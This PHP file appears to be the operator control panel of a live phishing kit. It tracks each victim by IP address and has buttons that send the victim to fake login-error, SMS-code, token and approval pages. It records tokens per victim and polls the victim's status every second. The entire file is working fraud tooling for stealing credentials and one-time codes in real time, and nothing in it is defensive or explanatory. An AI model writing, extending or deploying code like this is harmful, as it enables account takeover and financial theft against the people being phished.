<?php
// ---- BOOTSTRAP (no output before this line) ----
error_reporting(E_ALL);
ini_set('display_errors', 0); // keep off in production
require __DIR__ . '/panel.class.php';
$pnl = new Panel();

// ----- HELPERS -----
function redirect($url) {
    header('Location: ' . $url, true, 302);
    exit();
}

// ----- SAFE PAGE MAP (no ../, no raw paths from user) -----
$routes = [
    'login_error' => '../auth/mkfile.php?p=login&params=?e=ERROR',
    'exp'         => '../auth/mkfile.php?p=exp',
    'sms'         => '../auth/mkfile.php?p=sms',
    'sms_error'   => '../auth/mkfile.php?p=sms&params=?e=ERROR',
    'token'       => '../auth/mkfile.php?p=token',
    'aprouve'     => '../auth/mkfile.php?p=aprouve',
    'final'       => '../auth/mkfile.php?p=final',
    'exit'        => '../auth/exit.php',
];

// ----- HANDLE GET ACTION (redirection control) -----
if (isset($_GET['page'], $_GET['ip'])) {
    $ip   = $_GET['ip'];
    $key  = $_GET['page']; // this is now a key, not a path

    if (!isset($routes[$key])) {
        // unknown route - ignore or show error
        redirect('ctr.php?ip=' . urlencode($ip) . '&error=bad_page');
    }

    // Write/update whatever you need using the resolved *server-side* path:
    $target = $routes[$key];
    $pnl->editVicFIle($target, $ip);

    redirect('ctr.php?ip=' . urlencode($ip) . '&redirected=1');
}

// ----- HANDLE POST ACTION (token) -----
if (isset($_POST['add_token'], $_POST['token'], $_POST['ip'])) {
    $token = $_POST['token'];
    $ip    = $_POST['ip'];

    $pnl->updateD($ip, $token);

    redirect('ctr.php?ip=' . urlencode($ip) . '&updated=1');
}

// ----- RENDER PAGE (no redirects below this line) -----
$ipSafe   = isset($_GET['ip']) ? htmlspecialchars($_GET['ip'], ENT_QUOTES, 'UTF-8') : '';
$redirect = isset($_GET['redirected']);
$uploaded = isset($_GET['uploaded']);
$updated  = isset($_GET['updated']);
$error    = isset($_GET['error']) ? htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8') : '';
?>
<!doctype html>
<html>
<head>
  <title>Redirection Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="res/style.css">
</head>
<body>
<div class="btns">

<?php if ($redirect): ?>
  <h1>Redirected!</h1>
<?php endif; ?>

<?php if ($uploaded): ?>
  <h1>FILE UPLOADED!</h1>
<?php endif; ?>

<?php if ($updated): ?>
  <h1>DATA UPDATED!</h1>
<?php endif; ?>

<?php if ($error): ?>
  <h1 style="color:#f66;">Error: <?php echo $error; ?></h1>
<?php endif; ?>

<form>
  <span>[<?php echo $ipSafe; ?>]</span>
  <span>[<span id="statu">loading...</span>]</span>
</form>

<!-- Use route keys instead of raw paths -->
<form action="ctr.php" method="get">
  <h3 style="color:white;">Control options</h3>
  <input type="hidden" name="ip" value="<?php echo $ipSafe; ?>">
  <button type="submit" name="page" value="login_error">LOGIN ERROR</button>
  <button type="submit" name="page" value="exp">EXP</button>
  <button type="submit" name="page" value="sms">SMS</button>
  <button type="submit" name="page" value="sms_error">SMS ERROR</button>
  <button type="submit" name="page" value="token">TOKEN</button>
  <button type="submit" name="page" value="aprouve">APROUVE</button>
  <button type="submit" name="page" value="final">SUCCESS</button>
  <button type="submit" name="page" value="exit">EXIT</button>
</form>

<form action="ctr.php?ip=<?php echo $ipSafe; ?>" method="post">
  <h3 style="color:white;">TOKEN</h3>
  <input type="hidden" name="ip" value="<?php echo $ipSafe; ?>">
  <input type="text" required placeholder="Enter token" name="token" id="token">
  <button type="submit" name="add_token">ADD TOKEN</button>
</form>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
  setInterval(() => {
    $.post("get_statu.php", { get: 1, ip: '<?php echo $ipSafe; ?>' }, (res) => {
      $("#statu").html(res);
    });
  }, 1000);
</script>
</body>
</html>
